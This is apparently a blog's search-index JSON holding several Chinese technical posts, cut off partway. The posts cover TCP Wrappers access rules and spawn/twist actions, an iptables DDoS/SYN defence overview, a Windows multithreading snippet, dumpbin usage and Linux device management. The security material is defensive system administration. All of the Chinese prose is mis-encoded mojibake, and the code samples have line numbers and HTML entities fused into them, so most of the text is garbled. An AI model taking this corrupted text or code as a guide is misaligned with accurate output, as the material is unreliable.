ä¸Šè¿™ä¸ªç¼–è¯‘é€‰é¡¹æ¥æä¾› TCP Wrapper çš„åŠŸèƒ½ã€‚ æˆ‘ä»¬å¯ä»¥ä½¿ç”¨è¿™æ ·ä¸€ä¸ªå‘½ä»¤æ¥ç¡®å®šæˆ‘ä»¬è¦è¿‡æ»¤çš„æœåŠ¡æ˜¯å¦é“¾æ¥åˆ°äº†libwrap è¿™ä¸ªå‡½æ•°åº“ä¸­ 1234567ldd /path/service_name |grep libwrap#ä¾‹å¦‚ldd /usr/sbin/sshd | grep libwrap#è‹¥æ˜¯ä¸çŸ¥é“ç¨‹åºçš„æ‰€åœ¨ä½ç½®å¯ä»¥è¿™æ ·ldd $(which sshd) | grep libwrap 0x02 TCP Wrappers çš„ä½¿ç”¨ è¦å†³å®šä¸€ä¸ªå®¢æˆ·æ˜¯å¦è¢«å…è®¸è¿æ¥ä¸€é¡¹æœåŠ¡,TCP Wrappersä¼šå‚è€ƒä»¥ä¸‹ä¸¤ä¸ªæ–‡ä»¶ï¼š /etc/hosts.allow /etc/hosts.deny å½“ä¸€ä¸ªTCP Wrappersæ¥æ”¶åˆ°ä¸€ä¸ªå®¢æˆ·è¯·æ±‚æ—¶,å®ƒä¼šè¿è¡Œä»¥ä¸‹å‡ ä¸ªæ­¥éª¤: ![2-3-1](TCP Wrappers/13.png) ï¼ˆæ­¤å›¾çš„æ¥æºï¼šhttp://images.slideplayer.com/12/3366547/slides/slide_75.jpg) æ£€æŸ¥ /etc/hosts.allow.TCPä¼šç»•æœåŠ¡ä¼šå¾ªåºåœ°è§£é‡Š/etc/hosts.allowæ–‡ä»¶å¹¶åº”ç”¨ç¬¬ä¸€ä¸ªä¸ºè¿™ä¸ªæœåŠ¡æ‰€æŒ‡å®šçš„è§„åˆ™.å¦‚æœæ‰¾åˆ°äº†ä¸€ä¸ªåŒ¹é…çš„è§„åˆ™,åˆ™å…è®¸è¿æ¥.å¦‚æœæ‰¾ä¸åˆ°åŒ¹é…çš„è§„åˆ™,å°±ä¼šè¿›è¡Œä¸‹ä¸€ä¸ªæ­¥éª¤ã€‚ æ£€æŸ¥ /etc/hosts.deny.TCPä¼šç»•çš„æœåŠ¡ä¼šå¾ªåºåœ°æ¥è§£é‡Š/etc/hosts.denyæ–‡ä»¶.å¦‚æœæ‰¾åˆ°ä¸€ä¸ªåŒ¹é…çš„è§„åˆ™,åˆ™æ‹’ç»è¿™ä¸ªè¿æ¥.å¦‚æœæ‰¾ä¸åˆ°åŒ¹é…çš„è§„åˆ™,åˆ™å…è®¸è¿æ¥åˆ°è¿™ä¸ªæœåŠ¡ã€‚ è‹¥æ˜¯æ²¡æœ‰åŒ¹é…çš„è§„åˆ™ä¾¿è¿›å…¥æœåŠ¡ åœ¨ä½¿ç”¨ TCP Wrappers ä¿æŠ¤ç½‘ç»œæœåŠ¡æ—¶åº”è¯¥è€ƒè™‘ä»¥ä¸‹å‡ ä¸ªè¦ç‚¹: hosts.allow æˆ– hosts.deny çš„é…ç½®æ”¹å˜ä¼šç«‹å³ç”Ÿæ•ˆã€‚ ä¸¤ä¸ªè§„åˆ™æ–‡ä»¶æ˜¯æœ‰è¯»å–é¡ºåºçš„ï¼Œhosts.allowä¸­çš„è§„åˆ™ä¼šå…ˆè¢«è¯»å–åº”ç”¨,hosts.denyä¸­çš„è§„åˆ™åè¯»å–,å¦‚æœè®¿é—®ä¸€é¡¹æœåŠ¡åœ¨hosts.allowä¸­è®¾ç½®ä¸ºå…è®¸,é‚£ä¹ˆåœ¨hosts.denyä¸­åŒä¸€é¡¹æœåŠ¡çš„æ‹’ç»è®¿é—®è®¾ç½®åˆ™ä¸ä¼šç”Ÿæ•ˆ è§„åˆ™æ–‡ä»¶å†…çš„è¯»å–ä¹Ÿæ˜¯æœ‰é¡ºåºçš„ï¼Œæ¯ä¸ªæ–‡ä»¶ä¸­çš„å„é¡¹è§„åˆ™æ˜¯ç”±ä¸Šåˆ°ä¸‹è¢«è¯»å–çš„,ç¬¬ä¸€ä¸ªåŒ¹é…çš„è§„åˆ™ç”Ÿæ•ˆã€‚å› æ­¤,è§„åˆ™çš„æ’åˆ—é¡ºåºä¹Ÿå¾ˆé‡è¦ã€‚ æˆ‘ä»¬å¯ä»¥é€šè¿‡ä¸‹å›¾çœ‹åˆ°ï¼Œhosts.allow çš„é…ç½®æ–‡ä»¶ï¼Œé»˜è®¤çš„æ–‡æ¡£ç»™äºˆäº†æˆ‘ä»¬ä¸€äº›ä¾‹å­ ![2-3-2](TCP Wrappers/1.png) é€šè¿‡ä¾‹å­æˆ‘ä»¬å¯ä»¥çœ‹å‡ºè¿™ä¸ªé…ç½®æ–‡ä»¶æ˜¯æœ‰è¯­æ³•æ ¼å¼çš„ã€‚é¦–å…ˆç©ºè¡Œæˆ–ä»¥äº•å·(#)å¼€å§‹çš„è¡Œä¼šè¢«å¿½ç•¥ æ¯æ¡è§„åˆ™éƒ½ä½¿ç”¨ä»¥ä¸‹åŸºæœ¬æ ¼å¼æ¥å¯¹ç½‘ç»œæœåŠ¡çš„è®¿é—®è¿›è¡Œæ§åˆ¶: 1234&lt;daemon list&gt;: &lt;client list&gt; [: &lt;option&gt;: &lt;option&gt;: ...]#åŠ¨ä½œå¯æœ‰å¯æ— æœåŠ¡ç¨‹åºåˆ—è¡¨ï¼š å®¢æˆ·æœºåœ°å€ç«‹æ ‡ [:æ‰§è¡Œçš„åŠ¨ä½œ] åˆ—è¡¨ä¸­å­˜åœ¨å¤šä¸ªæœåŠ¡æˆ–è€…ä¸»æœºçš„æ—¶å€™ç”¨ ,é€—å·åˆ†éš”å¼€ã€‚ ä¾‹å¦‚æˆ‘ä»¬è¦TCP Wrappersç›‘æµ‹ 10.3.1.1 è¿™å°ä¸»æœºå‘æˆ‘ä»¬çš„ ssh çš„å®ˆæŠ¤è¿›ç¨‹å‘å‡ºé“¾æ¥ï¼Œå°±æ‹’ç»æ‰ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±æŠŠä¸‹é¢è¿™æ¡å‘½ä»¤å†™åœ¨ hosts.deny è¿™ä¸ªæ–‡ä»¶ä¸­ 1sshd : 10.3.1.1 æˆ‘ä»¬æ¥åšè¿™ä¹ˆä¸€ä¸ªå®éªŒæ¥è¯æ˜ Tcp wrappers æ˜¯èµ·ä½œç”¨çš„ é¦–å…ˆæˆ‘ä»¬å¯ä»¥çœ‹åˆ°æœ¬åœ°çš„ ssh æœåŠ¡æ˜¯å¼€å¯çš„ï¼Œå¹¶ä¸”å®éªŒèƒ½å¤Ÿæ­£å¸¸åœ°ä½¿ç”¨ ssh 12#æˆ‘ä»¬å¯ä»¥çœ‹åˆ° ssh çš„å®ˆæŠ¤è¿›ç¨‹æ­£åœ¨è¿è¡Œä¸­ps -ef | grep sshd ![2-3-3](TCP Wrappers/2.png) 12#å°è¯•è¿æ¥æˆ‘ä»¬æœ¬åœ°çš„22å·ç«¯å£ï¼Œä¹Ÿæ˜¯æˆåŠŸçš„telnet localhost 22 ![2-3-4](TCP Wrappers/3.png) 12345#è¿™æ˜¯æœ€ç›´æ¥çš„è¯æ˜æ–¹å¼ï¼Œç›´æ¥sshæˆ‘ä»¬çš„æœ¬åœ°ï¼Œå¯†ç ä¸º shiyanloussh shiyanlou@localhost#ç„¶åæˆ‘ä»¬å¯ä»¥é€šè¿‡topçš„ç¬¬ä¸€æ çœ‹åˆ°ï¼Œå½“å‰å­˜åœ¨çš„ç”¨æˆ·æœ‰ä¸¤ä¸ªï¼Œè¯´æ˜æˆ‘ä»¬æˆåŠŸç™»å…¥äº†top ![2-3-5](TCP Wrappers/4.png) ç”¨äº†è¿™ä¹ˆå¤šçš„æ–¹å¼æˆ‘ä»¬è¯æ˜äº†ï¼Œssh æ˜¯æ²¡æœ‰é—®é¢˜çš„ã€‚ç„¶åæˆ‘ä»¬é€šè¿‡è¿™ä¸ªå‘½ä»¤å°†è§„åˆ™å†™å…¥ hosts.denyä¸­ 1234sudo vim /etc/hosts.deny #è¿™æ˜¯éœ€è¦å†™å…¥çš„è§„åˆ™sshd: localhost ![2-3-6](TCP Wrappers/5.png) è¿™æ—¶å€™æˆ‘ä»¬å†æ¥å°è¯•è¿æ¥ ssh æœåŠ¡ï¼Œå°±ç”¨ä»¥ä¸Šçš„ä¸‰ç§æ–¹å¼ï¼Œå¯ä»¥çœ‹åˆ° sshd å¹¶æ²¡æœ‰åœæ­¢æœåŠ¡ï¼Œè¿˜åœ¨è¿è¡Œä¸­ï¼Œä½†æ˜¯ telnetã€ssh éƒ½æ²¡æœ‰åŠæ³•è¿æ¥ä¸Šå» ![2-3-7](TCP Wrappers/6.png) è‹¥æˆ‘ä»¬å°† hosts.denyä¸­çš„è§„åˆ™åˆ é™¤æ‰äº¦æˆ–è€…æ˜¯æ³¨é‡Šæ‰ï¼Œå†å°è¯•ä¸€æ¬¡è‚¯å®šæ˜¯æ²¡æœ‰é—®é¢˜çš„ã€‚ åœ¨ hosts.deny ä¸ hosts.allow çš„è¯­æ³•æ˜¯æ”¯æŒé€šé…ç¬¦çš„ï¼Œé€šé…ç¬¦æœ‰ä»¥ä¸‹è¿™äº› é€šé…ç¬¦ ä½œç”¨ ALL å®Œå…¨åŒ¹é…,å¯ä»¥ç”¨åœ¨å®ˆæŠ¤è¿›ç¨‹åˆ—è¡¨å’Œå®¢æˆ·åˆ—è¡¨ä¸­ LOCAL ä¸ä»»ä½•ä¸åŒ…æ‹¬ç‚¹(.)çš„ä¸»æœºåŒ¹é…,ä¹Ÿå°±æ˜¯localhostæœ¬æœº KNOWN ä¸ä»»ä½•å¸¦æœ‰å·²çŸ¥ä¸»æœºåå’Œä¸»æœºåœ°å€åŒ¹é… UNKNOWN ä¸ä»»ä½•å¸¦æœ‰æœªçŸ¥ä¸»æœºåå’Œä¸»æœºåœ°å€åŒ¹é… PARANOID ä¸ä»»ä½•å¸¦æœ‰ä¸»æœºåå’Œä¸»æœºåœ°å€ä¸ç›¸åŒ¹é…çš„ä¸»æœºåŒ¹é… æ¯”å¦‚è¿˜æ˜¯ä¸Šé¢çš„ä¾‹å­ ![2-3-8](TCP Wrappers/7.png) ä¸Šæ–‡æåˆ°è¿‡ï¼Œæˆ‘ä»¬çš„è§„åˆ™æ˜¯æœ‰è¯»å–é¡ºåºçš„ï¼Œå¦‚æˆ‘ä»¬åœ¨ hosts.allow ä¸­åŠ å…¥ ssh: LOCAL æˆ‘ä»¬ä¼šå‘ç° ssh ä¼šæ˜¯æˆåŠŸçš„ï¼Œhosts.deny ä¸­çš„é‚£æ¡è§„åˆ™å¯¹æœ¬æœºå¹¶æ²¡æœ‰ç”Ÿæ•ˆã€‚ ![2-3-9](TCP Wrappers/8.png) æ¨¡å¼å¯ä»¥ç”¨åœ¨è®¿é—®è§„åˆ™çš„å®¢æˆ·é¢†åŸŸé‡Œ,èƒ½å¤Ÿæ›´æœ‰æ•ˆç‡åœ°åŒ¹é…æˆ‘ä»¬æƒ³è¦åŒ¹é…çš„ç”¨æˆ·ï¼Œè¿™é‡Œåªåˆ—ä¸¾å¸¸ç”¨çš„æ–¹å¼ï¼Œéœ€è¦æ›´æ·±å…¥å­¦ä¹ çš„å¯ä»¥ä½¿ç”¨ man å‘½ä»¤æŸ¥çœ‹ ä¸»æœºåä»¥ç‚¹(.)å¼€å§‹,å¦‚æœåœ¨ä¸€ä¸ªä¸»æœºåçš„å¼€å§‹æ”¾ç½®ä¸€ä¸ªåœ†ç‚¹,é‚£ä¹ˆå°±ä¸æ‰€æœ‰å…±äº«è¿™ä¸ªä¸»æœºåä¸­åˆ—å‡ºçš„ç›¸åŒç»„æˆéƒ¨åˆ†çš„ä¸»æœºåŒ¹é….å¦‚: .simplecloud.com é€‚ç”¨äºåŒ¹é… simplecloud.com åŸŸåå†…çš„æ‰€æœ‰ä¸»æœº. IPåœ°å€ä»¥ç‚¹(.)ç»“æŸ,å¦‚æœåœ¨ä¸€ä¸ªIPåœ°å€çš„æœ«å°¾æ”¾ç½®ä¸€ä¸ªç‚¹,é‚£ä¹ˆå°±ä¸æœ€åä¸€ä¸ªç‚¹å‰åŒä¸€ä¸ªç½‘æ®µçš„æ‰€æœ‰ä¸»æœºåŒ¹é….å¦‚: 192.168. é€‚ç”¨äº 192.168.x.x ç½‘ç»œå†…çš„ä»»ä½•ä¸»æœº. ![2-3-10](TCP Wrappers/9.png) IPåœ°å€/å­ç½‘æ©ç ,è¿™æ ·çš„æ ¼å¼æ¥æ§åˆ¶æŸä¸ªç½‘æ®µçš„åœ°å€çš„è®¿é—®.å¦‚: 192.168.1.0 /255.255.255.0 é€‚ç”¨äºåœ°å€åŒºé—´ä»192.168.1.0 åˆ° 192.168.1.255 çš„æ‰€æœ‰ä¸»æœº. [IPv6åœ°å€] çš„åœ°å€ä¹Ÿæ˜¯å¯ä»¥è¯»å–çš„ æ˜Ÿå·(*)ï¼Œæ˜Ÿå·ä¸shellä¸­çš„é€šé…ç¬¦ä½œç”¨ç›¸åŒ æˆ‘ä»¬è¿˜å¯ä»¥ä½¿ç”¨è¿™ä¸ªåŠ¨ä½œæ¥æ‰§è¡Œä¸€äº› shell å‘½ä»¤ åŠ¨ä½œ ä½œç”¨ spawn å¼€å¯ä¸€ä¸ªshellæ‰§è¡Œä½ æŒ‡å®šçš„å‘½ä»¤ twist æ›¿æ¢è®¿é—®è€…çš„è¯·æ±‚æˆæˆ‘ä»¬æŒ‡å®šçš„å‘½ä»¤ å¦‚å›¾ä¸­ï¼Œæˆ‘ä»¬è‹¥æ˜¯åœ¨ hosts.deny ä¸­è¿™æ ·å†™ï¼Œä¼šæœ‰è¿™è¦çš„åé¦ˆæ•ˆæœï¼Œæˆ‘ä»¬å¯ä»¥äº†è§£åˆ°æ˜¯è°è¯•å›¾æ”»å‡»æˆ‘ä»¬ï¼Œæƒ³ç™»é™†æˆ‘ä»¬çš„ä¸»æœºäº†ï¼Œç„¶åå¯ä»¥å°æ‰ä»–çš„ IPã€‚ ![å›¾ç‰‡æè¿°](TCP Wrappers/10.png) ![å›¾ç‰‡æè¿°](TCP Wrappers/11.png) åŒæ ·æˆ‘ä»¬å¯ä»¥å°è¯•ä¸€ä¸‹ twist çš„ä½¿ç”¨ï¼Œåœ¨ /etc/hosts.deny ä¸­å†™ä¸‹è¿™ä¸ªå‘½ä»¤ï¼š 1sshd : localhost : twist /bin/echo &quot;Helloï¼Œattackerï¼ŒYou are prohibited from accessing this service!!&quot; ç„¶åæˆ‘ä»¬ç”¨ telnet æ¥å°è¯•é“¾æ¥ä»–ï¼Œä¼šå¾—åˆ°è¿™æ ·çš„ç»“æœï¼š ![2-3-12](TCP Wrappers/12.png) åœ¨å…¶ä¸­æˆ‘ä»¬å¯ä»¥ç”¨åˆ°è¿™æ ·çš„ä¸€äº›å‚æ•°ï¼Œè¿™é‡Œåªåˆ—ä¸¾äº†å¸¸ç”¨çš„ä¸€äº›å‚æ•°ï¼š å‚æ•° ä½œç”¨ %a å®¢æˆ·ç«¯çš„ipåœ°å€ %A æœåŠ¡ç«¯çš„ipåœ°å€ %d å®ˆæŠ¤è¿›ç¨‹çš„åå­— %h å®¢æˆ·ç«¯çš„ä¸»æœºå %H æœåŠ¡ç«¯çš„ä¸»æœºå %p å®ˆæŠ¤è¿›ç¨‹çš„pid %u å®¢æˆ·ç«¯çš„ç”¨æˆ·å æœ¬å®éªŒåªæ˜¯ç²—ç•¥çš„äº†è§£ä¸å°è¯• TCP wrappersï¼Œåœ¨å®é™…çš„ç”Ÿäº§ç¯å¢ƒä¸­ xinetd ä¸ TCP wrappers æ˜¯é»„é‡‘æ­æ¡£ï¼Œä¹ŸåŒæ ·èƒ½å¤Ÿåšåˆ°é˜²æ­¢ DOS æ”»å‡»ï¼Œä¸å®¢æˆ·ç«¯äº¤æ¢ï¼Œæ§åˆ¶è¿æ¥æ•°ç­‰ç­‰çš„é«˜çº§åŠŸèƒ½ã€‚è‹¥æƒ³æ›´åŠ åœ°æ·±å…¥çš„å­¦ä¹ ï¼Œå¤§å®¶å¯ä»¥å¤šçœ‹çœ‹ manï¼Œä¸ç½‘ä¸ŠæŸ¥æŸ¥èµ„æ–™ã€‚","tags":[{"name":"linux","slug":"linux","permalink":"https://hodlyounger.github.io/tags/linux/"},{"name":"linux\\é˜²ç«å¢™","slug":"linux-é˜²ç«å¢™","permalink":"https://hodlyounger.github.io/tags/linux-%E9%98%B2%E7%81%AB%E5%A2%99/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Linux","slug":"A-OS/Linux","permalink":"https://hodlyounger.github.io/categories/A-OS/Linux/"},{"name":"Linuxé˜²ç«å¢™","slug":"A-OS/Linux/Linuxé˜²ç«å¢™","permalink":"https://hodlyounger.github.io/categories/A-OS/Linux/Linux%E9%98%B2%E7%81%AB%E5%A2%99/"}]},{"title":"ã€Linuxé˜²ç«å¢™ã€‘æ”»å‡»ä¸é˜²å¾¡","date":"2024-01-15T16:00:00.000Z","path":"A_OS/Linux/Linuxé˜²ç«å¢™/ã€Linuxé˜²ç«å¢™ã€‘æ”»å‡»ä¸é˜²å¾¡/","text":"æ¦‚è¿°ï¼šåœ¨äº†è§£äº† iptables çš„ç»“æ„ä¸ç”¨æ³•ä¹‹åæˆ‘ä»¬éœ€è¦å­¦ä¼šåœ¨ç‰¹å®šçš„åœºæ™¯å»åº”ç”¨ä»–ä»¬ï¼Œè€Œä¸å†æ˜¯ç®€å•çš„çº¸ä¸Šè°ˆå…µã€‚æœ¬å®éªŒå°†å¸¦å¤§å®¶äº†è§£ç½‘ç»œå¼€æ”¾ä¹‹åå¯èƒ½å¸¦æ¥çš„æ”»å‡»ä»¥åŠå¦‚ä½•å»é¢„é˜² å®éªŒæ¶‰åŠçš„çŸ¥è¯†ç‚¹ DDOS æ”»å‡» SYN æ”»å‡»","tags":[{"name":"Linux","slug":"Linux","permalink":"https://hodlyounger.github.io/tags/Linux/"},{"name":"é˜²ç«å¢™","slug":"é˜²ç«å¢™","permalink":"https://hodlyounger.github.io/tags/%E9%98%B2%E7%81%AB%E5%A2%99/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Linux","slug":"A-OS/Linux","permalink":"https://hodlyounger.github.io/categories/A-OS/Linux/"},{"name":"Linuxé˜²ç«å¢™","slug":"A-OS/Linux/Linuxé˜²ç«å¢™","permalink":"https://hodlyounger.github.io/categories/A-OS/Linux/Linux%E9%98%B2%E7%81%AB%E5%A2%99/"}]},{"title":"ã€è°ƒè¯•æŠ€æœ¯ã€‘logexts","date":"2024-01-14T16:00:00.000Z","path":"wiki/è°ƒè¯•æŠ€æœ¯/ã€è°ƒè¯•æŠ€æœ¯ã€‘logexts/","text":"æ¦‚è¿°ï¼šlogexts ä½¿ç”¨ å®˜æ–¹æ–‡æ¡£ï¼šä½¿ç”¨è°ƒè¯•å™¨å’Œ Logexts.dll - Windows drivers | Microsoft Learn","tags":[{"name":"windows","slug":"windows","permalink":"https://hodlyounger.github.io/tags/windows/"},{"name":"windows/windbg","slug":"windows-windbg","permalink":"https://hodlyounger.github.io/tags/windows-windbg/"},{"name":"windbg","slug":"windbg","permalink":"https://hodlyounger.github.io/tags/windbg/"}],"categories":[{"name":"wiki","slug":"wiki","permalink":"https://hodlyounger.github.io/categories/wiki/"},{"name":"è°ƒè¯•æŠ€æœ¯","slug":"wiki/è°ƒè¯•æŠ€æœ¯","permalink":"https://hodlyounger.github.io/categories/wiki/%E8%B0%83%E8%AF%95%E6%8A%80%E6%9C%AF/"}]},{"title":"ã€Windowsã€‘ åˆ›å»ºå¤šçº¿ç¨‹","date":"2024-01-09T02:02:19.591Z","path":"A_OS/Windows/è¿›ç¨‹çº¿ç¨‹/ã€winã€‘åˆ›å»ºå¤šçº¿ç¨‹/","text":"æ¦‚è¿°ï¼šå¦‚ä½•åœ¨ windows ä¸‹ä¸ä½¿ç”¨ C++ æ ‡å‡†åº“å‡½æ•°åˆ›å»ºå¤šçº¿ç¨‹å¹¶ç­‰å¾…å…¶æ‰§è¡ŒçŠ¶æ€ å¦‚ä¸‹æ‰€ç¤ºä¸ºä¸€æ®µåˆ›å»ºå¤šçº¿ç¨‹å¹¶ç­‰å¾…æ‰§è¡Œå®Œæˆçš„ demoã€‚ä¹Ÿå¯å‚è€ƒå®˜æ–¹ç¤ºä¾‹ï¼Œä½¿ç”¨ createthread åˆ›å»ºï¼Œåˆ›å»ºçº¿ç¨‹ - Win32 apps | Microsoft Learn 123456789101112131415161718192021int nCount = g_tOracleUser.size(); HANDLE *pHandles = (HANDLE *)malloc(sizeof(HANDLE) * g_tOracleUser.size()); if (pHandles) &#123; int iHandleIndex = 0; for (auto &amp; user : g_tOracleUser) &#123; unsigned int dwThreadID = 0; pHandles[iHandleIndex] = (HANDLE)_beginthreadex(NULL, 0, (_beginthreadex_proc_type)&amp;_DoCheckThread, (LPVOID)user.GetString(), 0, &amp;dwThreadID); ATLTRACE(L&quot;[%s] _beginthreadex _SendDataSyncThread , dwThreadID : %u&quot;, __FUNCTIONW__, dwThreadID); iHandleIndex++; &#125; WaitForMultipleObjects(nCount, pHandles, TRUE, INFINITE); ATLTRACE(L&quot;[%s] all check finish...count : %d&quot;, __FUNCTIONW__, g_outRiskUsers.size()); tRiskUsers = g_outRiskUsers; &#125; else &#123; ATLTRACE(L&quot;[%s] malloc handle failed!!!&quot;, __FUNCTIONW__); &#125;","tags":[{"name":"windows","slug":"windows","permalink":"https://hodlyounger.github.io/tags/windows/"},{"name":"å¤šçº¿ç¨‹","slug":"å¤šçº¿ç¨‹","permalink":"https://hodlyounger.github.io/tags/%E5%A4%9A%E7%BA%BF%E7%A8%8B/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"è¿›ç¨‹çº¿ç¨‹","slug":"A-OS/Windows/è¿›ç¨‹çº¿ç¨‹","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/%E8%BF%9B%E7%A8%8B%E7%BA%BF%E7%A8%8B/"}]},{"title":"ã€å¼€å‘ã€‘æŸ¥çœ‹ç¼–è¯‘çš„libçš„è¿è¡Œåº“æ˜¯ä»€ä¹ˆ","date":"2023-12-29T02:08:27.232Z","path":"A_OS/Windows/å¼€å‘ç›¸å…³/ã€å¼€å‘ã€‘æŸ¥çœ‹ç¼–è¯‘çš„libæ–‡ä»¶è¿è¡Œåº“/","text":"æ¦‚è¿°ï¼šå¦‚ä½•æŸ¥çœ‹ç¼–è¯‘çš„ lib çš„è¿è¡Œåº“æ˜¯å•¥ 0x01 æŸ¥çœ‹è¿è¡Œåº“ 1dumpbin /directives foo.lib dumpbinè¾“å‡º å¯¹åº”çš„è¿è¡Œåº“ /DEFAULTLIB:MSVCRTD /MDd /DEFAULTLIB:MSVCRT /MD /DEFAULTLIB:LIBCMT /MT /DEFAULTLIB:LIBCMTD /MTD 0x02 æŸ¥çœ‹å¯¼å‡ºå‡½æ•° 1dumpbin /LINKERMEMBER foo.lib","tags":[{"name":"lib","slug":"lib","permalink":"https://hodlyounger.github.io/tags/lib/"},{"name":"dumpbin","slug":"dumpbin","permalink":"https://hodlyounger.github.io/tags/dumpbin/"}],"categories":[{"name":"A_OS","slug":"A-OS","permalink":"https://hodlyounger.github.io/categories/A-OS/"},{"name":"Windows","slug":"A-OS/Windows","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/"},{"name":"å¼€å‘ç›¸å…³","slug":"A-OS/Windows/å¼€å‘ç›¸å…³","permalink":"https://hodlyounger.github.io/categories/A-OS/Windows/%E5%BC%80%E5%8F%91%E7%9B%B8%E5%85%B3/"}]},{"title":"ã€åŸç†å‰–æã€‘c-Linux è®¾å¤‡ç®¡ç†","date":"2023-12-27T07:15:36.586Z","path":"A_OS/Linux/Linuxæ“ä½œç³»ç»ŸåŸç†å‰–æ/ã€åŸç†å‰–æã€‘c-Linux è®¾å¤‡ç®¡ç†/","text":"æ¦‚è¿°ï¼š Linux ç³»ç»Ÿè®¾å¤‡ç®¡ç†çš„ç‰¹ç‚¹ Linux è®¾å¤‡é©±åŠ¨ç¨‹åºçš„æ¥å£ Linux çš„ç£ç›˜é«˜é€Ÿç¼“å­˜ Linux å­—ç¬¦è®¾å¤‡ç¼“å†²åŒºç®¡ç† Linux çš„è®¾å¤‡é©±åŠ¨ 0x01 Linux ç³»ç»Ÿè®¾å¤‡ç®¡ç†çš„ç‰¹ç‚¹ Linux ç³»ç»ŸæŠŠè®¾å¤‡åˆ†ä¸ºä¸¤å¤§ç±»ã€‚ å—è®¾å¤‡ï¼šç”¨äºå­˜å‚¨ä¿¡æ¯ï¼Œå®ƒå¯¹ä¿¡æ¯çš„å­˜å–æ˜¯ä»¥ä¿¡æ¯å—ä¸ºå•ä½çš„ï¼Œå¦‚é€šå¸¸ä½¿ç”¨çš„ç£ç›˜ã€ç£å¸¦ç­‰ç­‰ã€‚ å­—ç¬¦è®¾å¤‡ï¼šé€šå¸¸ç”¨äºè¾“å…¥è¾“å…¥å‡ºï¼Œä½œä¸ºäººå’Œè®¡ç®—æœºä¹‹é—´çš„æ¥å£ï¼Œå®ƒå¯¹ä¿¡æ¯çš„å­˜å–æ˜¯ä»¥å­—ç¬¦ä¸ºå•ä½è¿›è¡Œçš„ï¼Œå¦‚é”®ç›˜ã€é¼ æ ‡ã€æ˜¾ç¤ºå™¨ã€æ‰“å°æœºç­‰ç­‰ã€‚ Linux ç³»ç»ŸæŠŠ I/O è®¾å¤‡çœ‹ä½œæ–‡ä»¶ï¼Œç§°ä¸ºç‰¹åˆ«æ–‡ä»¶ã€‚ä¾‹å¦‚ï¼šæ‰“å°æœºçš„æ–‡ä»¶åä¸º lp ï¼Œæ§åˆ¶ç»ˆç«¯çš„æ–‡ä»¶åä¸º consoleã€‚è¿™äº›ç‰¹åˆ«æ–‡ä»¶ç»„ç»‡åœ¨ç›®å½• /dev ä¸‹ã€‚å¦‚æœè¦è®¿é—®æ‰“å°æœºå¯ä»¥ä½¿ç”¨è·¯å¾„ /dev/lp ï¼Œä½¿ç”¨ç³»ç»Ÿè°ƒç”¨ open å¯ä»¥æ‰“å¼€è®¾å¤‡æ–‡ä»¶å¹¶è¿›è¡Œæ“ä½œã€‚ Linux ç³»ç»Ÿçš„è¿™ä¸€ç‰¹ç‚¹ä½¿å¾—ä»»ä½•å¤–éƒ¨è®¾å¤‡åœ¨ç”¨æˆ·é¢å‰ä¸æ™®é€šæ–‡ä»¶å®Œå…¨ä¸€æ ·ï¼Œè€Œä¸å¿…æ¶‰åŠå®ƒçš„ç‰©ç†ç‰¹æ€§ï¼Œç»™ç”¨æˆ·å¸¦æ¥æå¤§çš„æ–¹ä¾¿ã€‚åœ¨æ–‡ä»¶ç³»ç»Ÿå†…éƒ¨ï¼Œå¤–éƒ¨è®¾å¤‡å’Œæ™®é€šæ–‡ä»¶ä¸€æ ·å—åˆ°å­˜å–æ§åˆ¶çš„ä¿æŠ¤ï¼Œä»…ä»…åœ¨æœ€ç»ˆé©±åŠ¨è®¾å¤‡æ—¶æ‰è½¬å‘å„ä¸ªè®¾å¤‡çš„é©±åŠ¨ç¨‹åºã€‚å—è®¾å¤‡ä¸Šçš„æ™®é€šæ–‡ä»¶å’Œç›®å½•æ–‡ä»¶å¹¶ä¸æ˜¯è®¾å¤‡ç‰¹æ®Šæ–‡ä»¶ï¼Œä½†æ˜¯å—è®¾å¤‡æœ¬èº«å¯ä»¥ä½œä¸ºç‰¹æ®Šæ–‡ä»¶æ¥è®¿é—®ã€‚ 0x02 æ–‡ä»¶ç³»ç»Ÿä¸è®¾å¤‡é©±åŠ¨ç¨‹åºçš„æ¥å£ Linux ç³»ç»Ÿä¸ºå„ç±»è®¾å¤‡åˆ†åˆ«é…ç½®ä¸åŒçš„é©±åŠ¨ç¨‹åºï¼Œåœ¨ç”¨æˆ·ç¨‹åºä¸­é€šè¿‡è¯¥æ–‡ä»¶æ“ä½œæ–¹å¼ä½¿ç”¨è®¾å¤‡ï¼Œå¦‚ï¼šæ‰“å¼€ã€å…³é—­ã€è¯»ã€å†™ç­‰ç­‰ï¼Œç”±æ–‡ä»¶ç³»ç»Ÿè½¬å…¥è®¾å¤‡é©±åŠ¨ç¨‹åºã€‚ æ ¸å¿ƒä¸è®¾å¤‡é©±åŠ¨ç¨‹åºçš„æ¥å£æ˜¯å—è®¾å¤‡å¼€å…³è¡¨å’Œå­—ç¬¦è®¾å¤‡å¼€å…³è¡¨ã€‚æ¯ä¸€ç§è®¾å¤‡ç±»å‹åœ¨è¡¨ä¸­å ç”¨ä¸€ä¸ªè¡¨ç›®ï¼ŒåŒ…å«è‹¥å¹²æ•°æ®é¡¹ï¼Œå…¶ä¸­æœ‰ä¸€é¡¹ä¸ºè¯¥ç±»è®¾å¤‡é©±åŠ¨ç¨‹åºå…¥å£åœ°å€ï¼Œåœ¨ç³»ç»Ÿè°ƒç”¨æ—¶å¼•å¯¼æ ¸å¿ƒè½¬å‘é€‚å½“çš„é©±åŠ¨ç¨‹åºæ¥å£ã€‚ å¯¹è®¾å¤‡ç‰¹æ®Šæ–‡ä»¶çš„ç³»ç»Ÿè°ƒç”¨ï¼Œæ 